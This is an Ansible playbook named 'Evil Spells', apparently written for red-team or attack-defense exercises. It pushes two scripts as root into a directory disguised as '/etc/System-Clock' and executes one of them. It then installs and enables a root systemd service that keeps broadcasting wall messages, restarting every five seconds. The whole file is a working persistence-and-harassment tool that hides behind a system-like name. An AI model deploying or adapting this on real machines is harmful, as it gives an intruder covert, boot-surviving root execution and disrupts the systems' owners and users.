---
- name: Evil Spells 
  hosts: clients
  become: yes

  tasks: 
    - name: Copy spellbook script
      copy:
        src: "../evil_spellbook.sh"
        dest: "/etc/System-Clock/evil_spellbook.sh"
        mode: '0755'
  
    - name: Copy message script
      copy:
        src: "../thewallsaretalking.sh"
        dest: "/etc/System-Clock/thewallsaretalking.sh"
        mode: '0755'

    - name: Execute spellbook script
      command: /etc/System-Clock/evil_spellbook.sh

    - name: Create Wall service
      copy: 
        dest: /etc/systemd/system/wall.service
        content: | 
          [Unit]
          Description=Wall Broadcast Service
          After=network.target

          [Service]
          ExecStart=/bin/bash /etc/System-Clock/thewallsaretalking.sh
          Restart=always
          RestartSec=5
          User=root

          [Install]
          WantedBy=multi-user.target

    - name: Reload systemd
      command: systemctl daemon-reload

    - name: Enable and start Wall service
      systemd:
        name: wall
        enabled: yes
        state: started